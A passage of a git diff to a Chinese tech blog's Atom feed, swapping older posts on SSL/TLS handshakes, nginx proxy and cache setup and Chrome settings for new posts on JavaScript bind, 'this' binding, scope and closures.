@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://leecss.com</id>
     <title>当下</title>
-    <updated>2021-08-12T23:04:51.560Z</updated>
+    <updated>2021-08-30T00:38:25.714Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://leecss.com"/>
     <link rel="self" href="https://leecss.com/atom.xml"/>
@@ -10,916 +10,914 @@
     <icon>https://leecss.com/favicon.ico</icon>
     <rights>All rights reserved 2021, 当下</rights>
     <entry>
-        <title type="html"><![CDATA[http-图解https]]></title>
-        <id>https://leecss.com/post/http-tu-jie-https/</id>
-        <link href="https://leecss.com/post/http-tu-jie-https/">
+        <title type="html"><![CDATA[ js手写-bind]]></title>
+        <id>https://leecss.com/post/js-shou-xie-bind/</id>
+        <link href="https://leecss.com/post/js-shou-xie-bind/">
         </link>
-        <updated>2021-08-11T23:01:00.000Z</updated>
+        <updated>2021-08-30T00:37:35.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="概述">概述</h2>
+<p>手写bind</p>
+]]></summary>
         <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>本周，<a href="https://www.cloudflare.com/">CloudFlare</a>宣布，开始提供Keyless服务，即你把网站放到它们的CDN上，不用提供自己的私钥，也能使用SSL加密链接。</p>
-<p>我看了CloudFlare的说明（<a href="https://blog.cloudflare.com/announcing-keyless-ssl-all-the-benefits-of-cloudflare-without-having-to-turn-over-your-private-ssl-keys/">这里</a>和<a href="https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/">这里</a>），突然意识到这是绝好的例子，可以用来说明SSL/TLS协议的运行机制。它配有插图，很容易看懂。</p>
-<p>下面，我就用这些图片作为例子，配合我半年前写的<a href="https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html">《SSL/TLS协议运行机制的概述》</a>，来解释SSL协议。</p>
-<h2 id="一-ssl协议的握手过程">一、SSL协议的握手过程</h2>
-<p>开始加密通信之前，客户端和服务器首先必须建立连接和交换参数，这个过程叫做握手（handshake）。</p>
-<p>假定客户端叫做爱丽丝，服务器叫做鲍勃，整个握手过程可以用下图说明（点击看大图）。</p>
-<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628722928788.png" alt="" loading="lazy"></figure>
-<p>握手阶段分成五步。</p>
-<blockquote>
-<p>第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。</p>
-<p>第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。</p>
-<p>第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster secret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。</p>
-<p>第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。</p>
-<p>第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成&quot;对话密钥&quot;（session key），用来加密接下来的整个对话过程。</p>
-</blockquote>
-<p>上面的五步，画成一张图，就是下面这样。</p>
-<figure data-type="image" tabindex="2"><img src="https://leecss.com/post-images/1628722965974.png" alt="" loading="lazy"></figure>
-<h2 id="二-私钥的作用">二、私钥的作用</h2>
-<p>握手阶段有三点需要注意。</p>
-<blockquote>
-<p>（1）生成对话密钥一共需要三个随机数。</p>
-<p>（2）握手之后的对话使用&quot;对话密钥&quot;加密（对称加密），服务器的公钥和私钥只用于加密和解密&quot;对话密钥&quot;（非对称加密），无其他作用。</p>
-<p>（3）服务器公钥放在服务器的数字证书之中。</p>
-</blockquote>
-<p>从上面第二点可知，整个对话过程中（握手阶段和其后的对话），服务器的公钥和私钥只需要用到一次。这就是CloudFlare能够提供Keyless服务的根本原因。</p>
-<p>某些客户（比如银行）想要使用外部CDN，加快自家网站的访问速度，但是出于安全考虑，不能把私钥交给CDN服务商。这时，完全可以把私钥留在自家服务器，只用来解密对话密钥，其他步骤都让CDN服务商去完成。</p>
-<figure data-type="image" tabindex="3"><img src="https://leecss.com/post-images/1628722990019.png" alt="" loading="lazy"></figure>
-<p>上图中，银行的服务器只参与第四步，后面的对话都不再会用到私钥了。</p>
-<h2 id="三-dh算法的握手阶段">三、DH算法的握手阶段</h2>
-<p>整个握手阶段都不加密（也没法加密），都是明文的。因此，如果有人窃听通信，他可以知道双方选择的加密方法，以及三个随机数中的两个。整个通话的安全，只取决于第三个随机数（Premaster secret）能不能被破解。</p>
-<p>虽然理论上，只要服务器的公钥足够长（比如2048位），那么Premaster secret可以保证不被破解。但是为了足够安全，我们可以考虑把握手阶段的算法从默认的<a href="https://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html">RSA算法</a>，改为 <a href="https://zh.wikipedia.org/wiki/%E8%BF%AA%E8%8F%B2%EF%BC%8D%E8%B5%AB%E5%B0%94%E6%9B%BC%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2">Diffie-Hellman算法</a>（简称DH算法）。</p>
-<p>采用DH算法后，Premaster secret不需要传递，双方只要交换各自的参数，就可以算出这个随机数。</p>
-<figure data-type="image" tabindex="4"><img src="https://leecss.com/post-images/1628723043151.png" alt="" loading="lazy"></figure>
-<p>上图中，第三步和第四步由传递Premaster secret变成了传递DH算法所需的参数，然后双方各自算出Premaster secret。这样就提高了安全性。</p>
-<h2 id="四-session的恢复">四、session的恢复</h2>
-<p>握手阶段用来建立SSL连接。如果出于某种原因，对话中断，就需要重新握手。</p>
-<p>这时有两种方法可以恢复原来的session：一种叫做session ID，另一种叫做session ticket。</p>
-<p>session ID的思想很简单，就是每一次对话都有一个编号（session ID）。如果对话中断，下次重连的时候，只要客户端给出这个编号，且服务器有这个编号的记录，双方就可以重新使用已有的&quot;对话密钥&quot;，而不必重新生成一把。</p>
-<figure data-type="image" tabindex="5"><img src="https://leecss.com/post-images/1628723092336.png" alt="" loading="lazy"></figure>
-<p>上图中，客户端给出session ID，服务器确认该编号存在，双方就不再进行握手阶段剩余的步骤，而直接用已有的对话密钥进行加密通信。</p>
-<p>session ID是目前所有浏览器都支持的方法，但是它的缺点在于session ID往往只保留在一台服务器上。所以，如果客户端的请求发到另一台服务器，就无法恢复对话。session ticket就是为了解决这个问题而诞生的，目前只有Firefox和Chrome浏览器支持。</p>
-<figure data-type="image" tabindex="6"><img src="https://leecss.com/post-images/1628723132146.png" alt="" loading="lazy"></figure>
-<p>上图中，客户端不再发送session ID，而是发送一个服务器在上一次对话中发送过来的session ticket。这个session ticket是加密的，只有服务器才能解密，其中包括本次对话的主要信息，比如对话密钥和加密方法。当服务器收到session ticket以后，解密后就不必重新生成对话密钥了。</p>
-<h2 id="转载">转载</h2>
-<blockquote>
-<p>阮一峰</p>
-<p><a href="https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html">https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html</a></p>
-</blockquote>
+<p>手写bind</p>
+<!-- more -->
+<pre><code class="language-js">// 模拟 bind
+Function.prototype.bind1 = function () {
+    // 将参数拆解为数组
+    const args = Array.prototype.slice.call(arguments)
+
+    // 获取 this（数组第一项）
+    const t = args.shift()
+
+    // fn1.bind(...) 中的 fn1
+    const self = this
+
+    // 返回一个函数
+    return function () {
+        return self.apply(t, args)
+    }
+}
+
+function fn1(a, b, c) {
+    console.log('this', this)
+    console.log(a, b, c)
+    return 'this is fn1'
+}
+
+const fn2 = fn1.bind1({x: 100}, 10, 20, 30)
+const res = fn2()
+console.log(res)
+
+</code></pre>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[nginx-代理缓存]]></title>
-        <id>https://leecss.com/post/nginx-dai-li-huan-cun/</id>
-        <link href="https://leecss.com/post/nginx-dai-li-huan-cun/">
+        <title type="html"><![CDATA[JavaScript-this指向]]></title>
+        <id>https://leecss.com/post/javascript-this-zhi-xiang/</id>
+        <link href="https://leecss.com/post/javascript-this-zhi-xiang/">
         </link>
-        <updated>2021-08-11T00:42:31.000Z</updated>
+        <updated>2021-08-30T00:36:07.000Z</updated>
         <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>nginx代理缓存是代理服务器缓存，当有用户A第一次访问后，下一次别的用户访问(或用户A第二次用别的浏览器访问)，就会使用缓存，提升访问速度。</p>
-<h2 id="配置">配置</h2>
-<p>test.conf</p>
-<pre><code class="language-nginx">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;
-
-server {
-   listen       80;
-   server_name  test.com;
-
-   location / {
-       proxy_cache my_cache;
-       proxy_pass   http://127.0.0.1:8888;
-       proxy_set_header Host $host;
-   }
+<p><strong>this 的取值是在执行时确定的，不是定义时候确定的</strong></p>
+<h2 id="this的应用场景">this的应用场景</h2>
+<h3 id="作为普通函数">作为普通函数</h3>
+<pre><code class="language-js">function fn1() {
+  console.log(this)
 }
+fn1() // window
 </code></pre>
-<p><code>proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;</code></p>
-<p>第一个参数指定缓存保存的本地路径</p>
-<p>levels参数负责设置缓存目录级别</p>
-<blockquote>
-<p>当levels=1:2时，表示是两级目录，1和2表示用1位和2位16进制来命名目录名称。</p>
-<p>在此例中，第一级目录用1位16进制命名，如b；第二级目录用2位16进制命名，如2b。所以此例中一级目录有16个，二级目录有16*16=256个：<code>/cache/b/2b/d7b6e5978e3f042f52e875005925e51b</code></p>
-<p>总目录数为16*256=4096个。</p>
-</blockquote>
-<p>keys_zone参数用来为这个缓存区起名<br>
-10m 指内存缓存空间大小为10MB</p>
-<hr>
-<p><code>proxy_cache my_cache;</code>使用定义的缓存区</p>
-<h2 id="服务">服务</h2>
-<p>nginx-cache/test.html</p>
-<pre><code class="language-html">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-  &lt;meta charset=&quot;UTF-8&quot;&gt;
-  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
-  &lt;title&gt;Document&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-  &lt;div&gt;This is content, and data is: &lt;span id=&quot;data&quot;&gt;&lt;/span&gt;&lt;/div&gt;
-  &lt;button id=&quot;button&quot;&gt;click me&lt;/button&gt;
-&lt;/body&gt;
-&lt;script&gt;
-  var index = 0
-  function doRequest () {
-    var data = document.getElementById('data')
-    data.innerText = ''
-    fetch('/data', {
-      headers: {
-        'X-Test-Cache': index++
-      }
-    }).then(function (resp) {
-      return resp.text()
-    }).then(function (text) {
-      data.innerText = text
+<h3 id="使用-call-apply-bind">使用 call apply bind</h3>
+<pre><code class="language-js">function fn1() {
+  console.log(this)
+}
+fn1.call({ X:100 })  // {X: 100}
+
+const fn2 = fn1.bind({ x:200 })
+fn2()  // {x: 200}
+</code></pre>
+<h3 id="作为对象方法被调用">作为对象方法被调用</h3>
+<pre><code class="language-js">const zhangsan = {
+  name: 'zhangsan',
+  sayHi() {
+    // this 即当前对象
+    console.log(this)
+  },
+  wait() {
+    setTimeout(function() {
+      // this === window
+      console.log(this)
     })
   }
-  document.getElementById('button').addEventListener('click', doRequest)
-&lt;/script&gt;
-&lt;/html&gt;
-</code></pre>
-<p>nginx-cache/server.js</p>
-<pre><code class="language-js">const http = require('http')
-const fs = require('fs')
-
-const wait = (seconds) =&gt; {
-  return new Promise((resolve) =&gt; {
-    setTimeout(resolve, seconds * 1000)
-  })
 }
-http.createServer(function (request, response) {
-  console.log('request come', request.url)
-
-  if (request.url === '/') {
-    const html = fs.readFileSync('test.html', 'utf8')
-    response.writeHead(200, {
-      'Content-Type': 'text/html'
+zhangsan.sayHi() // {name: &quot;zhangsan&quot;, sayHi: ƒ, wait: ƒ}
+zhangsan.wait() // window
+</code></pre>
+<h3 id="箭头函数">箭头函数</h3>
+<pre><code class="language-js">const zhangsan = {
+  name: 'zhangsan',
+  sayHi() {
+    // this 即当前对象
+    console.log(this)
+  },
+  wait() {
+    setTimeout(() =&gt; {
+      // this 即当前对象
+      console.log(this)
     })
-    response.end(html)
   }
-
-  if (request.url === '/data') {
-    response.writeHead(200, {
-      'Cache-Control': 'max-age=2, s-maxage=20, private',
-      'Vary': 'X-Test-Cache'
-    })
-    wait(2).then(() =&gt; response.end('success'))
+}
+zhangsan.sayHi() // {name: &quot;zhangsan&quot;, sayHi: ƒ, wait: ƒ}
+zhangsan.wait() // {name: &quot;zhangsan&quot;, sayHi: ƒ, wait: ƒ}
+</code></pre>
+<h3 id="在-class-方法中调用">在 class 方法中调用</h3>
+<pre><code class="language-js">class People {
+  constructor(name) {
+    this.name = name
   }
-}).listen(8888)
-
-console.log('server listening on 8888')
-</code></pre>
-<p>max-age: 客户端缓存时长</p>
-<p>s-maxage：代理服务器缓存时长</p>
-<p>private：仅客户端可缓存</p>
-<p>Vary：仅当设置的属性值一致时使用缓存</p>
-<p>注意：修改代码看效果时，需要重启node服务</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[chrome-设置]]></title>
-        <id>https://leecss.com/post/chrome-she-zhi/</id>
-        <link href="https://leecss.com/post/chrome-she-zhi/">
-        </link>
-        <updated>2021-08-10T22:22:51.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>chrome功能设置及操作</p>
-<h2 id="启动时">启动时</h2>
-<h3 id="同时打开多网页">同时打开多网页</h3>
-<p>打开特定网页或一组网页</p>
-<pre><code class="language-sh">https://leecss.com/
-https://leecss.com/post/qian-duan-jiao-cheng-dao-hang/
-https://fanyi.baidu.com/
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[git-报错]]></title>
-        <id>https://leecss.com/post/git-bao-cuo/</id>
-        <link href="https://leecss.com/post/git-bao-cuo/">
-        </link>
-        <updated>2021-08-09T15:39:47.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>记录git操作的报错信息</p>
-<h2 id="列表">列表</h2>
-<p>1、在子目录中执行git命令，需切换到根目录</p>
-<blockquote>
-<p>You need to run this command from the toplevel of the working tree.</p>
-<p>您需要从工作树的顶层运行此命令。</p>
-</blockquote>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[nginx-安装和基础代理配置]]></title>
-        <id>https://leecss.com/post/nginx-an-zhuang-he-ji-chu-dai-li-pei-zhi/</id>
-        <link href="https://leecss.com/post/nginx-an-zhuang-he-ji-chu-dai-li-pei-zhi/">
-        </link>
-        <updated>2021-08-09T00:08:50.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="安装和启动">安装和启动</h2>
-<h3 id="安装">安装</h3>
-<p>windows</p>
-<p><a href="http://nginx.org/en/download.html">nginx下载地址</a></p>
-<p>选择nginx/Windows-[x.x.x]，点击下载即可，下载完成后解压到电脑中。</p>
-<h3 id="启动">启动</h3>
-<p>进入nginx解压目录，在命令行输入<code>.\nginx.exe</code>即可启动，打开浏览器输入<code>localhost</code>,看到下述内容说明启动成功。</p>
-<pre><code>Welcome to nginx!
-If you see this page, the nginx web server is successfully installed and working. Further configuration is required.
-
-For online documentation and support please refer to nginx.org.
-Commercial support is available at nginx.com.
-
-Thank you for using nginx.
-</code></pre>
-<h3 id="关闭">关闭</h3>
-<p>在任务管理器中结束nginx进程</p>
-<h3 id="命令">命令</h3>
-<p>启动；停止；退出。</p>
-<pre><code class="language-shell">start nginx
-nginx -s stop
-nginx -s quit
-</code></pre>
-<h2 id="配置">配置</h2>
-<h3 id="配置文件">配置文件</h3>
-<p>conf\nginx.conf为配置文件</p>
-<p>可以在conf中新建servers文件夹，将配置提取出来，然后在nginx.conf中引入，使目录结构更清晰</p>
-<pre><code class="language-nginx">    #gzip  on;
-
-    include  servers/*.conf;
-</code></pre>
-<p>注意<code>include servers/*.conf;</code>结尾要加分号</p>
-<h3 id="新建配置文件">新建配置文件</h3>
-<p>在servers目录下新建test.conf文件，并启动nginx</p>
-<pre><code class="language-nginx">server {
-   listen       80;
-   server_name  test.com;
-
-   location / {
-       proxy_pass   http://127.0.0.1:8888;
-   }
+  sayHi() {
+    console.log(this)
+  }
 }
+const zhangsan = new People('zhangsan')
+zhangsan.sayHi() // zhangsan对象： People {name: &quot;zhangsan&quot;}
 </code></pre>
-<blockquote>
-<p>listen: 监听的端口</p>
-<p>server_name: 浏览器访问的Host域名，根据访问的Host域名判断代理到什么地方</p>
-<p>proxy_pass: 实际代理的地方</p>
-</blockquote>
-<h3 id="在本地启动一个服务">在本地启动一个服务</h3>
-<p>新建server.js，<code>node server.js</code>启动服务</p>
-<pre><code class="language-js">const http = require('http')
-
-http.createServer(function (request, response) {
-    console.log('request come', request.url)
-
-    response.end('123')
-}).listen(8888)
-
-console.log('server listening on 8888')
-</code></pre>
-<h3 id="462错误">462错误</h3>
-<p>在浏览器访问<code>test.com</code>,页面出现462错误。</p>
-<p>1、先了解两个东西</p>
-<p>DNS：把域名解析为IP地址，保存的就是域名和ip的映射关系。一个域名和一个ip地址绑定，一个ip地址可以被多个域名绑定。</p>
-<p>本地hosts：修改hosts文件实现域名本地解析–相当于本地DNS服务器，正常是先走本地（hosts），本地失败再走网络的DNS服务器</p>
-<p>另外，hosts文件里边只能配置ip和域名的映射关系，不能配端口号</p>
-<p>2、分析一下访问过程：</p>
-<p>当我们在浏览器访问test.com时，先去走DNS解析，在本地我们没有修改hosts文件，所以会走网络的DNS解析服务器，而网络上并没有这个域名，所以没有解析到ip地址，也就无法访问服务器，没有内容返回。</p>
-<p>假如我们配置了hosts文件，<code>127.0.0.1 test.com</code>,即将test.com解析到本地，于是就能访问到我们本地启动的web服务器<code>http://127.0.0.1:8888</code>，然后由于我们启动了nginx,并且匹配到<code>test.com</code>Host请求头，所以拦截了请求并转发到<code>http://127.0.0.1:8888</code>,于是我们就可以通过配置的代理，使用域名来访问本地的服务。</p>
-<p>由上述过程可知，我并没有配置hosts，所以我配置了之后重新访问，发现依然不能正常访问。</p>
-<p><strong>配置hosts: 修改C:\Windows\System32\drivers\etc\hosts文件</strong></p>
-<p>3、谷歌浏览器启用了hsts的安全策略，当你输入网址时，默认访问https协议，且当你第一次访问https协议后，下一次都会自动转为https协议。</p>
-<p>禁止谷歌自动将http自动转为https</p>
-<ol>
-<li>地址栏中输入 <code>chrome://net-internals/#hsts</code></li>
-<li>在 <code>Delete domain security policies</code> 中输入项目的域名，并 <code>Delete</code> 删除</li>
-<li>可以在 <code>Query domain</code> 测试是否删除成功</li>
-</ol>
-<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628468089288.png" alt="" loading="lazy"></figure>
-<p>当上述操作仍然不奏效后，清除浏览器缓存，再次尝试，成功。</p>
-<h3 id="配置获取浏览器实际访问的域名">配置获取浏览器实际访问的域名</h3>
-<p>nginx-test.conf</p>
-<p><code>proxy_set_header Host $host;</code></p>
-<pre><code class="language-nginx">server {
-   listen       80;
-   server_name  test.com;
-
-   location / {
-       proxy_pass   http://127.0.0.1:8888;
-       proxy_set_header Host $host;
-   }
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ JavaScript-作用域和闭包]]></title>
+        <id>https://leecss.com/post/javascript-zuo-yong-yu-he-bi-bao/</id>
+        <link href="https://leecss.com/post/javascript-zuo-yong-yu-he-bi-bao/">
+        </link>
+        <updated>2021-08-30T00:34:37.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="作用域">作用域</h2>
+<p>作用域：变量的合法使用范围<br>
+全局作用域：在全局可以使用<br>
+函数作用域：只能在函数块中使用<br>
+块级作用域（ES6新增）：let，const定义的变量有块级作用域{}内部使用</p>
+<h2 id="自由变量">自由变量</h2>
+<p>1.一个变量在当前作用域没有定义，但是被使用了<br>
+2.向上级作用域，一层一层依次寻找，直到找到为止<br>
+3.如果到全局作用域都没找到，则报错：xxx is not defined</p>
+<h2 id="闭包">闭包</h2>
+<p>闭包：作用域应用的一种特殊情况<br>
+表现：</p>
+<p>函数作为参数被传递</p>
+<pre><code class="language-js">// 函数作为参数被传递
+function print(fn) {
+    const a = 200
+    fn()
 }
+const a = 100
+function fn() {
+    console.log(a)
+}
+print(fn) // 100
 </code></pre>
-<p>server.js</p>
-<pre><code class="language-js">const http = require('http')
+<p>函数作为返回值被返回</p>
+<pre><code class="language-js">// 函数作为返回值
+function create() {
+    const a = 100
+    return function () {
+        console.log(a)
+    }
+}
 
-http.createServer(function (request, response) {
-    console.log('request come', request.headers.host)
-
-    response.end(request.headers.host)
-}).listen(8888)
-
-console.log('server listening on 8888')
+const fn = create()
+const a = 200
+fn() // 100
 </code></pre>
-<p>添加完配置之后，可以看到，获取的<code>request.headers.host</code>由实际的<code>127.0.0.1:8888</code>变成了<code>test.com</code><br>
-修改完之后，需要从任务管理器中杀死nginx进程，然后再重启nginx</p>
+<p><strong>所有的自由变量的查找，是在函数定义的地方，向上级作用域查找，不是在执行的地方</strong></p>
 <h2 id="推荐阅读">推荐阅读</h2>
-<p><a href="https://www.cnblogs.com/thewindkee/p/12873181.html">如何禁止chrome浏览器http自动转成https</a></p>
+<p><a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#function.scopes">http://bonsaiden.github.io/JavaScript-Garden/zh/#function.scopes</a></p>
+<p><a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#function.closures">http://bonsaiden.github.io/JavaScript-Garden/zh/#function.closures</a></p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[软件汇总]]></title>
-        <id>https://leecss.com/post/ruan-jian-hui-zong/</id>
-        <link href="https://leecss.com/post/ruan-jian-hui-zong/">
+        <title type="html"><![CDATA[JavaScript-Object对象方法hasOwnProperty]]></title>
+        <id>https://leecss.com/post/javascript-object-dui-xiang-fang-fa-hasownproperty/</id>
+        <link href="https://leecss.com/post/javascript-object-dui-xiang-fang-fa-hasownproperty/">
         </link>
-        <updated>2021-08-08T09:16:21.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="web服务器">web服务器</h2>
-<p><a href="http://nginx.org/en/download.html">nginx</a></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[http-https协议概述]]></title>
-        <id>https://leecss.com/post/http-https-xie-yi/</id>
-        <link href="https://leecss.com/post/http-https-xie-yi/">
-        </link>
-        <updated>2021-08-08T02:58:58.000Z</updated>
+        <updated>2021-08-29T05:39:52.000Z</updated>
         <content type="html"><![CDATA[<h2 id="概述">概述</h2>
-<p>互联网的通信安全，建立在SSL/TLS协议之上。</p>
-<p>本文简要介绍SSL/TLS协议的运行机制。文章的重点是设计思想和运行过程，不涉及具体的实现细节。如果想了解这方面的内容，请参阅<a href="https://tools.ietf.org/html/rfc5246">RFC文档</a>。</p>
-<h2 id="一-作用">一、作用</h2>
-<p>不使用SSL/TLS的HTTP通信，就是不加密的通信。所有信息明文传播，带来了三大风险。</p>
-<blockquote>
-<p>（1） <strong>窃听风险</strong>（eavesdropping）：第三方可以获知通信内容。</p>
-<p>（2） <strong>篡改风险</strong>（tampering）：第三方可以修改通信内容。</p>
-<p>（3） <strong>冒充风险</strong>（pretending）：第三方可以冒充他人身份参与通信。</p>
-</blockquote>
-<p>SSL/TLS协议是为了解决这三大风险而设计的，希望达到：</p>
-<blockquote>
-<p>（1） 所有信息都是<strong>加密传播</strong>，第三方无法窃听。</p>
-<p>（2） 具有<strong>校验机制</strong>，一旦被篡改，通信双方会立刻发现。</p>
-<p>（3） 配备<strong>身份证书</strong>，防止身份被冒充。</p>
-</blockquote>
-<p>互联网是开放环境，通信双方都是未知身份，这为协议的设计带来了很大的难度。而且，协议还必须能够经受所有匪夷所思的攻击，这使得SSL/TLS协议变得异常复杂。</p>
-<h2 id="二-历史">二、历史</h2>
-<p>互联网加密通信协议的历史，几乎与互联网一样长。</p>
-<blockquote>
-<p>1994年，NetScape公司设计了SSL协议（Secure Sockets Layer）的1.0版，但是未发布。</p>
-<p>1995年，NetScape公司发布SSL 2.0版，很快发现有严重漏洞。</p>
-<p>1996年，SSL 3.0版问世，得到大规模应用。</p>
-<p>1999年，互联网标准化组织ISOC接替NetScape公司，发布了SSL的升级版<a href="https://en.wikipedia.org/wiki/Secure_Sockets_Layer">TLS</a> 1.0版。</p>
-<p>2006年和2008年，TLS进行了两次升级，分别为TLS 1.1版和TLS 1.2版。最新的变动是2011年TLS 1.2的<a href="https://tools.ietf.org/html/rfc6176">修订版</a>。</p>
-</blockquote>
-<p>目前，应用最广泛的是TLS 1.0，接下来是SSL 3.0。但是，主流浏览器都已经实现了TLS 1.2的支持。</p>
-<p>TLS 1.0通常被标示为SSL 3.1，TLS 1.1为SSL 3.2，TLS 1.2为SSL 3.3。</p>
-<h2 id="三-基本的运行过程">三、基本的运行过程</h2>
-<p>SSL/TLS协议的基本思路是采用<a href="https://en.wikipedia.org/wiki/Public-key_cryptography">公钥加密法</a>，也就是说，客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密。</p>
-<p>但是，这里有两个问题。</p>
-<p><strong>（1）如何保证公钥不被篡改？</strong></p>
-<blockquote>
-<p>解决方法：将公钥放在<a href="https://en.wikipedia.org/wiki/Digital_certificate">数字证书</a>中。只要证书是可信的，公钥就是可信的。</p>
-</blockquote>
-<p><strong>（2）公钥加密计算量太大，如何减少耗用的时间？</strong></p>
-<blockquote>
-<p>解决方法：每一次对话（session），客户端和服务器端都生成一个&quot;对话密钥&quot;（session key），用它来加密信息。由于&quot;对话密钥&quot;是对称加密，所以运算速度非常快，而服务器公钥只用于加密&quot;对话密钥&quot;本身，这样就减少了加密运算的消耗时间。</p>
-</blockquote>
-<p>因此，SSL/TLS协议的基本过程是这样的：</p>
-<blockquote>
-<p>（1） 客户端向服务器端索要并验证公钥。</p>
-<p>（2） 双方协商生成&quot;对话密钥&quot;。</p>
-<p>（3） 双方采用&quot;对话密钥&quot;进行加密通信。</p>
-</blockquote>
-<p>上面过程的前两步，又称为&quot;握手阶段&quot;（handshake）。</p>
-<h2 id="四-握手阶段的详细过程">四、握手阶段的详细过程</h2>
-<figure data-type="image" tabindex="1"><img src="https://leecss.com/post-images/1628721665340.png" alt="" loading="lazy"></figure>
-<p>&quot;握手阶段&quot;涉及四次通信，我们一个个来看。需要注意的是，&quot;握手阶段&quot;的所有通信都是明文的。</p>
-<h3 id="41-客户端发出请求clienthello">4.1 客户端发出请求（ClientHello）</h3>
-<p>首先，客户端（通常是浏览器）先向服务器发出加密通信的请求，这被叫做ClientHello请求。</p>
-<p>在这一步，客户端主要向服务器提供以下信息。</p>
-<blockquote>
-<p>（1） 支持的协议版本，比如TLS 1.0版。</p>
-<p>（2） 一个客户端生成的随机数，稍后用于生成&quot;对话密钥&quot;。</p>
-<p>（3） 支持的加密方法，比如RSA公钥加密。</p>
-<p>（4） 支持的压缩方法。</p>
-</blockquote>
-<p>这里需要注意的是，客户端发送的信息之中不包括服务器的域名。也就是说，理论上服务器只能包含一个网站，否则会分不清应该向客户端提供哪一个网站的数字证书。这就是为什么通常一台服务器只能有一张数字证书的原因。</p>
-<p>对于虚拟主机的用户来说，这当然很不方便。2006年，TLS协议加入了一个<a href="https://tools.ietf.org/html/rfc4366">Server Name Indication扩展</a>，允许客户端向服务器提供它所请求的域名。</p>
-<h3 id="42-服务器回应severhello">4.2 服务器回应（SeverHello）</h3>
-<p>服务器收到客户端请求后，向客户端发出回应，这叫做SeverHello。服务器的回应包含以下内容。</p>
-<blockquote>
-<p>（1） 确认使用的加密通信协议版本，比如TLS 1.0版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信。</p>
-<p>（2） 一个服务器生成的随机数，稍后用于生成&quot;对话密钥&quot;。</p>
-<p>（3） 确认使用的加密方法，比如RSA公钥加密。</p>
-<p>（4） 服务器证书。</p>
-</blockquote>
-<p>除了上面这些信息，如果服务器需要确认客户端的身份，就会再包含一项请求，要求客户端提供&quot;客户端证书&quot;。比如，金融机构往往只允许认证客户连入自己的网络，就会向正式客户提供USB密钥，里面就包含了一张客户端证书。</p>
-<h3 id="43-客户端回应">4.3 客户端回应</h3>
-<p>客户端收到服务器回应以后，首先验证服务器证书。如果证书不是可信机构颁布、或者证书中的域名与实际域名不一致、或者证书已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。</p>
-<p>如果证书没有问题，客户端就会从证书中取出服务器的公钥。然后，向服务器发送下面三项信息。</p>
-<blockquote>
-<p>（1） 一个随机数。该随机数用服务器公钥加密，防止被窃听。</p>
-<p>（2） 编码改变通知，表示随后的信息都将用双方商定的加密方法和密钥发送。</p>
-<p>（3） 客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供服务器校验。</p>
-</blockquote>
-<p>上面第一项的随机数，是整个握手阶段出现的第三个随机数，又称&quot;pre-master key&quot;。有了它以后，客户端和服务器就同时有了三个随机数，接着双方就用事先商定的加密方法，各自生成本次会话所用的同一把&quot;会话密钥&quot;。</p>
-<p>至于为什么一定要用三个随机数，来生成&quot;会话密钥&quot;，<a href="http://blog.csdn.net/dog250/article/details/5717162">dog250</a>解释得很好：</p>
-<blockquote>
-<p>&quot;不管是客户端还是服务器，都需要随机数，这样生成的密钥才不会每次都一样。由于SSL协议中证书是静态的，因此十分有必要引入一种随机因素来保证协商出来的密钥的随机性。</p>
-<p>对于RSA密钥交换算法来说，pre-master-key本身就是一个随机数，再加上hello消息中的随机，三个随机数通过一个密钥导出器最终导出一个对称密钥。</p>
